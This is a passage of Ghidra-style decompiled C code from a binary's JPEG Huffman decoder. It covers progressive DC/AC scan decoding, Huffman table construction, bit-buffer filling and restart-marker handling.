          pbVar10 = local_2c;
          pbVar12 = local_30;
          if ((int)uVar7 < 0) {
            return 0;
          }
        }
        else {
LAB_00424b0a:
          uVar7 = (int)pbVar12 >> ((char)pbVar10 - 8U & 0x1f) & 0xff;
          iVar6 = *(int *)(iVar8 + 0x90 + uVar7 * 4);
          if (iVar6 == 0) {
            local_44 = 9;
            goto LAB_00424b44;
          }
          uVar7 = (uint)*(byte *)(iVar8 + 0x490 + uVar7);
          pbVar10 = pbVar10 + -iVar6;
        }
        uVar9 = uVar7;
        if (uVar7 != 0) {
          if (((int)pbVar10 < (int)uVar7) &&
             (iVar8 = FUN_0042589c(&local_38,pbVar12,pbVar10,uVar7), pbVar10 = local_2c,
             pbVar12 = local_30, iVar8 == 0)) {
            return 0;
          }
          pbVar10 = pbVar10 + -uVar7;
          uVar9 = (int)pbVar12 >> ((byte)pbVar10 & 0x1f) & (1 << ((byte)uVar7 & 0x1f)) - 1U;
          if ((int)uVar9 < *(int *)(&DAT_00440adc + uVar7 * 4)) {
            uVar9 = *(int *)(&DAT_00440b1c + uVar7 * 4) + uVar9;
          }
        }
        iVar8 = aiStack32[iVar4];
        aiStack32[iVar4] = uVar9 + iVar8;
        *psVar2 = (short)(uVar9 + iVar8) << ((byte)uVar5 & 0x1f);
        local_3c = local_3c + 1;
        local_40 = local_40 + 1;
      }
      ppbVar3 = *(byte ***)(param_1 + 0x18);
      *ppbVar3 = local_38;
      ppbVar3[1] = local_34;
      *(byte **)(iVar1 + 0xc) = pbVar12;
      *(byte **)(iVar1 + 0x10) = pbVar10;
      puVar11 = &local_24;
      puVar13 = (undefined4 *)(iVar1 + 0x14);
      for (iVar4 = 5; iVar4 != 0; iVar4 = iVar4 + -1) {
        *puVar13 = *puVar11;
        puVar11 = puVar11 + (uint)bVar14 * -2 + 1;
        puVar13 = puVar13 + (uint)bVar14 * -2 + 1;
      }
    }
    *(int *)(iVar1 + 0x28) = *(int *)(iVar1 + 0x28) + -1;
    uVar5 = 1;
  }
  else {
    uVar5 = 0;
  }
  return uVar5;
}



undefined4 FUN_00424c44(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  byte **ppbVar3;
  int iVar4;
  undefined4 uVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  byte *pbVar9;
  byte *pbVar10;
  uint uVar11;
  int local_34;
  int local_30;
  byte *local_24;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  int local_14;
  
  iVar1 = *(int *)(param_1 + 0x1bc);
  iVar8 = *(int *)(param_1 + 0x194);
  uVar5 = *(undefined4 *)(param_1 + 0x19c);
  if (((*(int *)(param_1 + 0x114) == 0) || (*(int *)(iVar1 + 0x28) != 0)) ||
     (iVar4 = FUN_00424994(param_1), iVar4 != 0)) {
    if (*(int *)(iVar1 + 8) == 0) {
      local_30 = *(int *)(iVar1 + 0x14);
      if (local_30 == 0) {
        local_24 = **(byte ***)(param_1 + 0x18);
        local_20 = (*(byte ***)(param_1 + 0x18))[1];
        pbVar10 = *(byte **)(iVar1 + 0xc);
        pbVar9 = *(byte **)(iVar1 + 0x10);
        iVar4 = *param_2;
        iVar2 = *(int *)(iVar1 + 0x3c);
        local_14 = param_1;
        for (local_34 = *(int *)(param_1 + 400); local_34 <= iVar8; local_34 = local_34 + 1) {
          if ((int)pbVar9 < 8) {
            iVar6 = FUN_0042589c(&local_24,pbVar10,pbVar9,0);
            if (iVar6 == 0) {
              return 0;
            }
            pbVar9 = local_18;
            pbVar10 = local_1c;
            if (7 < (int)local_18) goto LAB_00424d50;
            iVar6 = 1;
LAB_00424d80:
            uVar7 = FUN_004259e8(&local_24,pbVar10,pbVar9,iVar6,iVar2);
            pbVar9 = local_18;
            pbVar10 = local_1c;
            if ((int)uVar7 < 0) {
              return 0;
            }
          }
          else {
LAB_00424d50:
            uVar7 = (int)pbVar10 >> ((char)pbVar9 - 8U & 0x1f) & 0xff;
            iVar6 = *(int *)(iVar2 + 0x90 + uVar7 * 4);
            if (iVar6 == 0) {
              iVar6 = 9;
              goto LAB_00424d80;
            }
            uVar7 = (uint)*(byte *)(iVar2 + 0x490 + uVar7);
            pbVar9 = pbVar9 + -iVar6;
          }
          iVar6 = (int)uVar7 >> 4;
          uVar7 = uVar7 & 0xf;
          if (uVar7 == 0) {
            if (iVar6 != 0xf) {
              local_30 = 1 << ((byte)iVar6 & 0x1f);
              if (iVar6 != 0) {
                if (((int)pbVar9 < iVar6) &&
                   (iVar8 = FUN_0042589c(&local_24,pbVar10,pbVar9,iVar6), pbVar9 = local_18,
                   pbVar10 = local_1c, iVar8 == 0)) {
                  return 0;
                }
                pbVar9 = pbVar9 + -iVar6;
                local_30 = local_30 + ((int)pbVar10 >> ((byte)pbVar9 & 0x1f) & local_30 - 1U);
              }
              local_30 = local_30 + -1;
              break;
            }
            local_34 = local_34 + 0xf;
          }
          else {
            local_34 = local_34 + iVar6;
            if (((int)pbVar9 < (int)uVar7) &&
               (iVar6 = FUN_0042589c(&local_24,pbVar10,pbVar9,uVar7), pbVar9 = local_18,
               pbVar10 = local_1c, iVar6 == 0)) {
              return 0;
            }
            pbVar9 = pbVar9 + -uVar7;
            uVar11 = (int)pbVar10 >> ((byte)pbVar9 & 0x1f) & (1 << (sbyte)uVar7) - 1U;
            if ((int)uVar11 < *(int *)(&DAT_00440adc + uVar7 * 4)) {
              uVar11 = *(int *)(&DAT_00440b1c + uVar7 * 4) + uVar11;
            }
            *(short *)(iVar4 + (&DAT_00440da8)[local_34] * 2) =
                 (short)uVar11 << ((byte)uVar5 & 0x1f);
          }
        }
        ppbVar3 = *(byte ***)(param_1 + 0x18);
        *ppbVar3 = local_24;
        ppbVar3[1] = local_20;
        *(byte **)(iVar1 + 0xc) = pbVar10;
        *(byte **)(iVar1 + 0x10) = pbVar9;
      }
      else {
        local_30 = local_30 + -1;
      }
      *(int *)(iVar1 + 0x14) = local_30;
    }
    uVar5 = 1;
    *(int *)(iVar1 + 0x28) = *(int *)(iVar1 + 0x28) + -1;
  }
  else {
    uVar5 = 0;
  }
  return uVar5;
}



undefined4 FUN_00424ed0(int param_1,ushort **param_2)

{
  int iVar1;
  ushort *puVar2;
  byte **ppbVar3;
  int iVar4;
  undefined4 uVar5;
  byte *pbVar6;
  byte *pbVar7;
  ushort local_2c;
  int local_28;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  byte *local_14;
  int local_10;
  
  iVar1 = *(int *)(param_1 + 0x1bc);
  uVar5 = *(undefined4 *)(param_1 + 0x19c);
  if (((*(int *)(param_1 + 0x114) == 0) || (*(int *)(iVar1 + 0x28) != 0)) ||
     (iVar4 = FUN_00424994(param_1), iVar4 != 0)) {
    local_20 = **(byte ***)(param_1 + 0x18);
    local_1c = (*(byte ***)(param_1 + 0x18))[1];
    pbVar7 = *(byte **)(iVar1 + 0xc);
    pbVar6 = *(byte **)(iVar1 + 0x10);
    local_10 = param_1;
    for (local_28 = 0; local_28 < *(int *)(param_1 + 0x164); local_28 = local_28 + 1) {
      puVar2 = *param_2;
      if (((int)pbVar6 < 1) &&
         (iVar4 = FUN_0042589c(&local_20,pbVar7,pbVar6,1), pbVar6 = local_14, pbVar7 = local_18,
         iVar4 == 0)) {
        return 0;
      }
      pbVar6 = pbVar6 + -1;
      if (((int)pbVar7 >> ((byte)pbVar6 & 0x1f) & 1U) != 0) {
        local_2c = (ushort)(1 << ((byte)uVar5 & 0x1f));
        *puVar2 = *puVar2 | local_2c;
      }
      param_2 = param_2 + 1;
    }
    ppbVar3 = *(byte ***)(param_1 + 0x18);
    *ppbVar3 = local_20;
    ppbVar3[1] = local_1c;
    *(byte **)(iVar1 + 0xc) = pbVar7;
    *(byte **)(iVar1 + 0x10) = pbVar6;
    *(int *)(iVar1 + 0x28) = *(int *)(iVar1 + 0x28) + -1;
    uVar5 = 1;
  }
  else {
    uVar5 = 0;
  }
  return uVar5;
}



undefined4 FUN_00424fc8(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  byte **ppbVar3;
  uint uVar4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  uint uVar8;
  int iVar9;
  short *psVar10;
  int iVar11;
  int *piVar12;
  uint uVar13;
  byte *pbVar14;
  byte *pbVar15;
  short local_14c;
  short local_148;
  int local_144;
  int local_140;
  int local_130;
  int *local_12c;
  int *local_128;
  byte *local_124;
  byte *local_120;
  byte *local_11c;
  byte *local_118;
  int *local_114;
  int aiStack272 [64];
  
  iVar1 = param_1[0x6f];
  iVar2 = param_1[0x65];
  uVar13 = 1 << ((byte)param_1[0x67] & 0x1f);
  uVar4 = -1 << ((byte)param_1[0x67] & 0x1f);
  if (((param_1[0x45] == 0) || (*(int *)(iVar1 + 0x28) != 0)) ||
     (iVar5 = FUN_00424994((int)param_1), iVar5 != 0)) {
    if (*(int *)(iVar1 + 8) == 0) {
      local_124 = *(byte **)param_1[6];
      local_120 = ((byte **)param_1[6])[1];
      pbVar15 = *(byte **)(iVar1 + 0xc);
      pbVar14 = *(byte **)(iVar1 + 0x10);
      local_140 = *(int *)(iVar1 + 0x14);
      iVar5 = *param_2;
      iVar11 = *(int *)(iVar1 + 0x3c);
      local_130 = 0;
      local_144 = param_1[100];
      local_14c = (short)uVar13;
      local_148 = (short)uVar4;
      local_114 = param_1;
      if (local_140 == 0) {
        local_128 = aiStack272;
        local_12c = &DAT_00440da8 + local_144;
        for (; local_144 <= iVar2; local_144 = local_144 + 1) {
          if ((int)pbVar14 < 8) {
            iVar7 = FUN_0042589c(&local_124,pbVar15,pbVar14,0);
            if (iVar7 == 0) goto LAB_004253be;
            pbVar14 = local_118;
            pbVar15 = local_11c;
            if (7 < (int)local_118) goto LAB_00425104;
            iVar7 = 1;
LAB_00425134:
            uVar8 = FUN_004259e8(&local_124,pbVar15,pbVar14,iVar7,iVar11);
            pbVar14 = local_118;
            pbVar15 = local_11c;
            if ((int)uVar8 < 0) goto LAB_004253be;
          }
          else {
LAB_00425104:
            uVar8 = (int)pbVar15 >> ((char)pbVar14 - 8U & 0x1f) & 0xff;
            iVar7 = *(int *)(iVar11 + 0x90 + uVar8 * 4);
            if (iVar7 == 0) {
              iVar7 = 9;
              goto LAB_00425134;
            }
            uVar8 = (uint)*(byte *)(iVar11 + 0x490 + uVar8);
            pbVar14 = pbVar14 + -iVar7;
          }
          iVar7 = (int)uVar8 >> 4;
          uVar8 = uVar8 & 0xf;
          if (uVar8 == 0) {
            if (iVar7 != 0xf) {
              local_140 = 1 << ((byte)iVar7 & 0x1f);
              if (iVar7 != 0) {
                if (((int)pbVar14 < iVar7) &&
                   (iVar11 = FUN_0042589c(&local_124,pbVar15,pbVar14,iVar7), pbVar14 = local_118,
                   pbVar15 = local_11c, iVar11 == 0)) goto LAB_004253be;
                pbVar14 = pbVar14 + -iVar7;
                local_140 = local_140 + ((int)pbVar15 >> ((byte)pbVar14 & 0x1f) & local_140 - 1U);
              }
              break;
            }
          }
          else {
            if (uVar8 != 1) {
              *(undefined4 *)(*param_1 + 0x14) = 0x76;
              (**(code **)(*param_1 + 4))(param_1,0xffffffff);
            }
            if (((int)pbVar14 < 1) &&
               (iVar9 = FUN_0042589c(&local_124,pbVar15,pbVar14,1), pbVar14 = local_118,
               pbVar15 = local_11c, iVar9 == 0)) goto LAB_004253be;
            pbVar14 = pbVar14 + -1;
            uVar8 = uVar4;
            if (((int)pbVar15 >> ((byte)pbVar14 & 0x1f) & 1U) != 0) {
              uVar8 = uVar13;
            }
          }
          do {
            psVar10 = (short *)(*local_12c * 2 + iVar5);
            if (*psVar10 == 0) {
              iVar7 = iVar7 + -1;
              if (iVar7 < 0) break;
            }
            else {
              if (((int)pbVar14 < 1) &&
                 (iVar9 = FUN_0042589c(&local_124,pbVar15,pbVar14,1), pbVar14 = local_118,
                 pbVar15 = local_11c, iVar9 == 0)) goto LAB_004253be;
              pbVar14 = pbVar14 + -1;
              if ((((int)pbVar15 >> ((byte)pbVar14 & 0x1f) & 1U) != 0) &&
                 (((int)*psVar10 & uVar13) == 0)) {
                if (*psVar10 < 0) {
                  *psVar10 = *psVar10 + local_148;
                }
                else {
                  *psVar10 = *psVar10 + local_14c;
                }
              }
            }
            local_144 = local_144 + 1;
            local_12c = local_12c + 1;
          } while (local_144 <= iVar2);
          if (uVar8 != 0) {
            iVar7 = *local_12c;
            *(short *)(iVar5 + iVar7 * 2) = (short)uVar8;
            *local_128 = iVar7;
            local_130 = local_130 + 1;
            local_128 = local_128 + 1;
          }
          local_12c = local_12c + 1;
        }
      }
      if (local_140 != 0) {
        for (; local_144 <= iVar2; local_144 = local_144 + 1) {
          psVar10 = (short *)((&DAT_00440da8)[local_144] * 2 + iVar5);
          if (*psVar10 != 0) {
            if (((int)pbVar14 < 1) &&
               (iVar11 = FUN_0042589c(&local_124,pbVar15,pbVar14,1), pbVar14 = local_118,
               pbVar15 = local_11c, iVar11 == 0)) {
LAB_004253be:
              piVar12 = aiStack272 + local_130;
              for (; 0 < local_130; local_130 = local_130 + -1) {
                piVar12 = piVar12 + -1;
                *(undefined2 *)(iVar5 + *piVar12 * 2) = 0;
              }
              return 0;
            }
            pbVar14 = pbVar14 + -1;
            if ((((int)pbVar15 >> ((byte)pbVar14 & 0x1f) & 1U) != 0) &&
               (((int)*psVar10 & uVar13) == 0)) {
              if (*psVar10 < 0) {
                *psVar10 = *psVar10 + local_148;
              }
              else {
                *psVar10 = *psVar10 + local_14c;
              }
            }
          }
        }
        local_140 = local_140 + -1;
      }
      ppbVar3 = (byte **)param_1[6];
      *ppbVar3 = local_124;
      ppbVar3[1] = local_120;
      *(byte **)(iVar1 + 0xc) = pbVar15;
      *(byte **)(iVar1 + 0x10) = pbVar14;
      *(int *)(iVar1 + 0x14) = local_140;
    }
    uVar6 = 1;
    *(int *)(iVar1 + 0x28) = *(int *)(iVar1 + 0x28) + -1;
  }
  else {
    uVar6 = 0;
  }
  return uVar6;
}



void FUN_004253f4(int param_1)

{
  code **ppcVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x40);
  *(code ***)(param_1 + 0x1bc) = ppcVar1;
  *ppcVar1 = FUN_00424740;
  iVar2 = 0;
  ppcVar1 = ppcVar1 + 0xb;
  do {
    iVar2 = iVar2 + 1;
    *ppcVar1 = (code *)0x0;
    ppcVar1 = ppcVar1 + 1;
  } while (iVar2 < 4);
  puVar3 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,*(int *)(param_1 + 0x24) << 8);
  *(undefined4 **)(param_1 + 0xa0) = puVar3;
  for (iVar2 = 0; iVar2 < *(int *)(param_1 + 0x24); iVar2 = iVar2 + 1) {
    iVar4 = 0;
    do {
      *puVar3 = 0xffffffff;
      puVar3 = puVar3 + 1;
      iVar4 = iVar4 + 1;
    } while (iVar4 < 0x40);
  }
  return;
}



void FUN_00425468(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  int *piVar5;
  int local_1c;
  int local_18;
  int *local_14;
  undefined4 *local_10;
  
  iVar1 = param_1[0x6f];
  if ((((param_1[100] != 0) || (param_1[0x65] != 0x3f)) || (param_1[0x66] != 0)) ||
     (param_1[0x67] != 0)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x7a;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
  }
  local_10 = (undefined4 *)(iVar1 + 0x14);
  local_14 = param_1 + 0x53;
  for (local_1c = 0; local_1c < param_1[0x52]; local_1c = local_1c + 1) {
    iVar3 = *(int *)(*local_14 + 0x14);
    iVar2 = *(int *)(*local_14 + 0x18);
    FUN_004255a0(param_1,1,iVar3,(int *)(iVar1 + 0x28 + iVar3 * 4));
    FUN_004255a0(param_1,0,iVar2,(int *)(iVar1 + 0x38 + iVar2 * 4));
    *local_10 = 0;
    local_10 = local_10 + 1;
    local_14 = local_14 + 1;
  }
  puVar4 = (undefined4 *)(iVar1 + 0x48);
  piVar5 = param_1 + 0x5a;
  for (local_18 = 0; local_18 < param_1[0x59]; local_18 = local_18 + 1) {
    iVar3 = param_1[*piVar5 + 0x53];
    *puVar4 = *(undefined4 *)(iVar1 + 0x28 + *(int *)(iVar3 + 0x14) * 4);
    puVar4[10] = *(undefined4 *)(iVar1 + 0x38 + *(int *)(iVar3 + 0x18) * 4);
    if (*(int *)(iVar3 + 0x30) == 0) {
      puVar4[0x1e] = 0;
      puVar4[0x14] = 0;
    }
    else {
      puVar4[0x14] = 1;
      puVar4[0x1e] = (uint)(1 < *(int *)(iVar3 + 0x24));
    }
    puVar4 = puVar4 + 1;
    piVar5 = piVar5 + 1;
  }
  *(undefined4 *)(iVar1 + 0x10) = 0;
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 8) = 0;
  *(int *)(iVar1 + 0x24) = param_1[0x45];
  return;
}



void FUN_004255a0(int *param_1,int param_2,int param_3,int *param_4)

{
  uint uVar1;
  int iVar2;
  char *pcVar3;
  int iVar4;
  byte bVar5;
  int *piVar6;
  int **ppiVar7;
  byte *pbVar8;
  int *piVar9;
  int *apiStack1340 [257];
  char local_138 [260];
  byte *local_34;
  byte *local_30;
  int **local_2c;
  byte *local_28;
  int *local_24;
  int local_20;
  uint local_1c;
  int local_18;
  int local_14;
  byte *local_10;
  int local_c;
  int *local_8;
  
  local_c = param_2;
  local_8 = param_1;
  if ((param_3 < 0) || (3 < param_3)) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x32;
    *(int *)(iVar2 + 0x18) = param_3;
    (**(code **)*param_1)();
  }
  if (local_c == 0) {
    local_10 = (byte *)local_8[param_3 + 0x31];
  }
  else {
    local_10 = (byte *)local_8[param_3 + 0x2d];
  }
  if (local_10 == (byte *)0x0) {
    iVar2 = *local_8;
    *(undefined4 *)(iVar2 + 0x14) = 0x32;
    *(int *)(iVar2 + 0x18) = param_3;
    (**(code **)*local_8)();
  }
  if (*param_4 == 0) {
    iVar2 = (**(code **)local_8[1])(local_8,1,0x590);
    *param_4 = iVar2;
  }
  iVar2 = 1;
  local_14 = *param_4;
  *(byte **)(*param_4 + 0x8c) = local_10;
  local_18 = 0;
  pbVar8 = local_10;
  do {
    pbVar8 = pbVar8 + 1;
    local_1c = (uint)*pbVar8;
    if (0x100 < (int)(local_18 + local_1c)) {
      *(undefined4 *)(*local_8 + 0x14) = 8;
      (**(code **)*local_8)();
    }
    pcVar3 = local_138 + local_18;
    while (uVar1 = local_1c, local_1c = local_1c - 1, uVar1 != 0) {
      *pcVar3 = (char)iVar2;
      local_18 = local_18 + 1;
      pcVar3 = pcVar3 + 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x11);
  piVar9 = (int *)0x0;
  local_138[local_18] = '\0';
  local_20 = local_18;
  iVar2 = (int)local_138[0];
  local_18 = 0;
  while (local_138[local_18] != '\0') {
    ppiVar7 = apiStack1340 + local_18;
    for (pcVar3 = local_138 + local_18; iVar2 == *pcVar3; pcVar3 = pcVar3 + 1) {
      *ppiVar7 = piVar9;
      ppiVar7 = ppiVar7 + 1;
      local_18 = local_18 + 1;
      piVar9 = (int *)((int)piVar9 + 1);
    }
    if (1 << ((byte)iVar2 & 0x1f) <= (int)piVar9) {
      *(undefined4 *)(*local_8 + 0x14) = 8;
      (**(code **)*local_8)();
    }
    piVar9 = (int *)((int)piVar9 * 2);
    iVar2 = iVar2 + 1;
  }
  local_18 = 0;
  iVar2 = 1;
  piVar9 = (int *)(local_14 + 0x4c);
  local_24 = piVar9;
  pbVar8 = local_10;
  do {
    pbVar8 = pbVar8 + 1;
    if (*pbVar8 == 0) {
      local_24[-0x12] = -1;
      piVar6 = local_24;
    }
    else {
      *local_24 = local_18 - (int)apiStack1340[local_18];
      local_18 = local_18 + (uint)*pbVar8;
      piVar6 = apiStack1340[local_18 + -1];
      local_24[-0x12] = (int)piVar6;
      piVar9 = local_24;
    }
    local_24 = local_24 + 1;
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x11);
  *(undefined4 *)(local_14 + 0x44) = 0xfffff;
  FUN_00420fb0((char)(local_14 + 0x90),(char)piVar9,(char)piVar6,local_14 + 0x90,0,0x400);
  local_18 = 0;
  iVar2 = 1;
  local_24 = (int *)local_10;
  do {
    local_24 = (int *)((int)local_24 + 1);
    local_34 = local_10 + local_18 + 0x11;
    local_2c = apiStack1340 + local_18;
    local_28 = (byte *)local_24;
    for (local_1c = 1; (int)local_1c <= (int)(uint)*(byte *)local_24; local_1c = local_1c + 1) {
      bVar5 = 8 - (char)iVar2;
      iVar4 = (int)*local_2c << (bVar5 & 0x1f);
      local_30 = local_34;
      pbVar8 = (byte *)(local_14 + 0x490 + iVar4);
      piVar9 = (int *)(local_14 + 0x90 + iVar4 * 4);
      for (iVar4 = 1 << (bVar5 & 0x1f); 0 < iVar4; iVar4 = iVar4 + -1) {
        *piVar9 = iVar2;
        piVar9 = piVar9 + 1;
        *pbVar8 = *local_34;
        pbVar8 = pbVar8 + 1;
      }
      local_2c = local_2c + 1;
      local_34 = local_34 + 1;
      local_18 = local_18 + 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 9);
  if (local_c != 0) {
    local_1c = 0;
    local_24 = (int *)(local_10 + 0x11);
    if (0 < local_20) {
      do {
        if (0xf < *(byte *)local_24) {
          *(undefined4 *)(*local_8 + 0x14) = 8;
          (**(code **)*local_8)();
        }
        local_1c = local_1c + 1;
        local_24 = (int *)((int)local_24 + 1);
      } while ((int)local_1c < local_20);
    }
  }
  return;
}



undefined4 FUN_0042589c(byte **param_1,byte *param_2,byte *param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  byte *local_10;
  byte *local_c;
  
  pbVar4 = *param_1;
  pbVar5 = param_1[1];
  piVar1 = (int *)param_1[4];
  local_10 = param_3;
  local_c = param_2;
  if (piVar1[0x68] == 0) {
    if ((int)param_3 < 0x19) {
      do {
        if (pbVar5 == (byte *)0x0) {
          iVar2 = (**(code **)(piVar1[6] + 0xc))();
          if (iVar2 == 0) {
            return 0;
          }
          pbVar4 = *(byte **)piVar1[6];
          pbVar5 = ((byte **)piVar1[6])[1];
        }
        pbVar5 = pbVar5 + -1;
        uVar3 = (uint)*pbVar4;
        pbVar4 = pbVar4 + 1;
        if (uVar3 == 0xff) {
          do {
            if (pbVar5 == (byte *)0x0) {
              iVar2 = (**(code **)(piVar1[6] + 0xc))();
              if (iVar2 == 0) {
                return 0;
              }
              pbVar4 = *(byte **)piVar1[6];
              pbVar5 = ((byte **)piVar1[6])[1];
            }
            pbVar5 = pbVar5 + -1;
            uVar3 = (uint)*pbVar4;
            pbVar4 = pbVar4 + 1;
          } while (uVar3 == 0xff);
          if (uVar3 != 0) {
            piVar1[0x68] = uVar3;
            goto LAB_0042596c;
          }
          uVar3 = 0xff;
        }
        local_c = (byte *)(uVar3 | (int)local_c << 8);
        local_10 = local_10 + 8;
      } while ((int)local_10 < 0x19);
    }
  }
  else {
LAB_0042596c:
    if ((int)local_10 < param_4) {
      if (*(int *)(piVar1[0x6f] + 8) == 0) {
        *(undefined4 *)(*piVar1 + 0x14) = 0x75;
        (**(code **)(*piVar1 + 4))(piVar1,0xffffffff);
        *(undefined4 *)(piVar1[0x6f] + 8) = 1;
      }
      local_c = (byte *)((int)local_c << (0x19U - (char)local_10 & 0x1f));
      local_10 = (byte *)0x19;
    }
  }
  *param_1 = pbVar4;
  param_1[1] = pbVar5;
  param_1[2] = local_c;
  param_1[3] = local_10;
  return 1;
}



uint FUN_004259e8(byte **param_1,byte *param_2,byte *param_3,int param_4,int param_5)

{
  int *piVar1;
  int iVar2;
  byte *pbVar3;
  uint uVar4;
  int *local_10;
  byte *local_c;
  
  local_c = param_2;
  if ((int)param_3 < param_4) {
    iVar2 = FUN_0042589c(param_1,param_2,param_3,param_4);
    if (iVar2 == 0) {
      return 0xffffffff;
    }
    local_c = param_1[2];
    param_3 = param_1[3];
  }
  pbVar3 = param_3 + -param_4;
  uVar4 = (int)local_c >> ((byte)pbVar3 & 0x1f) & (1 << ((byte)param_4 & 0x1f)) - 1U;
  local_10 = (int *)(param_5 + param_4 * 4);
  do {
    if ((int)uVar4 <= *local_10) {
      param_1[2] = local_c;
      param_1[3] = pbVar3;
      if (param_4 < 0x11) {
        uVar4 = (uint)*(byte *)(*(int *)(param_5 + 0x8c) + uVar4 + 0x11 +
                               *(int *)(param_5 + 0x48 + param_4 * 4));
      }
      else {
        piVar1 = (int *)param_1[4];
        *(undefined4 *)(*piVar1 + 0x14) = 0x76;
        (**(code **)(*piVar1 + 4))(piVar1,0xffffffff);
        uVar4 = 0;
      }
      return uVar4;
    }
    if ((int)pbVar3 < 1) {
      iVar2 = FUN_0042589c(param_1,local_c,pbVar3,1);
      if (iVar2 == 0) {
        return 0xffffffff;
      }
      local_c = param_1[2];
      pbVar3 = param_1[3];
    }
    pbVar3 = pbVar3 + -1;
    uVar4 = uVar4 * 2 | (int)local_c >> ((byte)pbVar3 & 0x1f) & 1U;
    param_4 = param_4 + 1;
    local_10 = local_10 + 1;
  } while( true );
}



undefined4 FUN_00425ae0(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  
  iVar2 = *(int *)(param_1 + 0x1bc);
  iVar3 = *(int *)(iVar2 + 0x10);
  if (iVar3 < 0) {
    iVar3 = iVar3 + 7;
  }
  piVar1 = (int *)(*(int *)(param_1 + 0x1b8) + 0x18);
  *piVar1 = *piVar1 + (iVar3 >> 3);
  *(undefined4 *)(iVar2 + 0x10) = 0;
  iVar3 = (**(code **)(*(int *)(param_1 + 0x1b8) + 8))();
  if (iVar3 == 0) {
    return 0;
  }
  puVar4 = (undefined4 *)(iVar2 + 0x14);
  for (iVar3 = 0; iVar3 < *(int *)(param_1 + 0x148); iVar3 = iVar3 + 1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined4 *)(iVar2 + 0x24) = *(undefined4 *)(param_1 + 0x114);
  if (*(int *)(param_1 + 0x1a0) == 0) {
    *(undefined4 *)(iVar2 + 8) = 0;
  }
  return 1;
}



undefined4 FUN_00425b50(int param_1,int *param_2)

{
  int iVar1;
  undefined2 *puVar2;
  int iVar3;
  byte **ppbVar4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  byte *pbVar10;
  int *piVar11;
  byte *pbVar12;
  int *piVar13;
  byte bVar14;
  int local_58;
  int local_48;
  int local_44;
  int *local_40;
  int *local_3c;
  int *local_38;
  byte *local_34;
  byte *local_30;
  byte *local_2c;
  byte *local_28;
  int local_24;
  int local_20 [4];
  
  bVar14 = 0;
  iVar1 = *(int *)(param_1 + 0x1bc);
  if (((*(int *)(param_1 + 0x114) == 0) || (*(int *)(iVar1 + 0x24) != 0)) ||
     (iVar5 = FUN_00425ae0(param_1), iVar5 != 0)) {
    if (*(int *)(iVar1 + 8) == 0) {
      local_34 = **(byte ***)(param_1 + 0x18);
      local_30 = (*(byte ***)(param_1 + 0x18))[1];
      pbVar12 = *(byte **)(iVar1 + 0xc);
      pbVar10 = *(byte **)(iVar1 + 0x10);
      piVar11 = (int *)(iVar1 + 0x14);
      piVar13 = local_20;
      for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {
        *piVar13 = *piVar11;
        piVar11 = piVar11 + (uint)bVar14 * -2 + 1;
        piVar13 = piVar13 + (uint)bVar14 * -2 + 1;
      }
      local_38 = (int *)(param_1 + 0x168);
      local_3c = (int *)(iVar1 + 0x48);
      local_40 = param_2;
      local_24 = param_1;
      for (local_58 = 0; local_58 < *(int *)(param_1 + 0x164); local_58 = local_58 + 1) {
        puVar2 = (undefined2 *)*local_40;
        iVar5 = *local_3c;
        iVar3 = local_3c[10];
        if ((int)pbVar10 < 8) {
          iVar7 = FUN_0042589c(&local_34,pbVar12,pbVar10,0);
          if (iVar7 == 0) {
            return 0;
          }
          pbVar10 = local_28;
          pbVar12 = local_2c;
          if (7 < (int)local_28) goto LAB_00425c59;
          iVar7 = 1;
LAB_00425c89:
          uVar8 = FUN_004259e8(&local_34,pbVar12,pbVar10,iVar7,iVar5);
          pbVar10 = local_28;
          pbVar12 = local_2c;
          if ((int)uVar8 < 0) {
            return 0;
          }
        }
        else {
LAB_00425c59:
          uVar8 = (int)pbVar12 >> ((char)pbVar10 - 8U & 0x1f) & 0xff;
          iVar7 = *(int *)(iVar5 + 0x90 + uVar8 * 4);
          if (iVar7 == 0) {
            iVar7 = 9;
            goto LAB_00425c89;
          }
          uVar8 = (uint)*(byte *)(iVar5 + 0x490 + uVar8);
          pbVar10 = pbVar10 + -iVar7;
        }
        uVar9 = uVar8;
        if (uVar8 != 0) {
          if (((int)pbVar10 < (int)uVar8) &&
             (iVar5 = FUN_0042589c(&local_34,pbVar12,pbVar10,uVar8), pbVar10 = local_28,
             pbVar12 = local_2c, iVar5 == 0)) {
            return 0;
          }
          pbVar10 = pbVar10 + -uVar8;
          uVar9 = (int)pbVar12 >> ((byte)pbVar10 & 0x1f) & (1 << ((byte)uVar8 & 0x1f)) - 1U;
          if ((int)uVar9 < *(int *)(&DAT_00440b5c + uVar8 * 4)) {
            uVar9 = *(int *)(&DAT_00440b9c + uVar8 * 4) + uVar9;
          }
        }
        if (local_3c[0x14] != 0) {
          iVar5 = local_20[*local_38];
          local_20[*local_38] = uVar9 + iVar5;
          *puVar2 = (short)(uVar9 + iVar5);
        }
        if (local_3c[0x1e] == 0) {
          iVar5 = 1;
          do {
            if ((int)pbVar10 < 8) {
              iVar7 = FUN_0042589c(&local_34,pbVar12,pbVar10,0);
              if (iVar7 == 0) {
                return 0;
              }
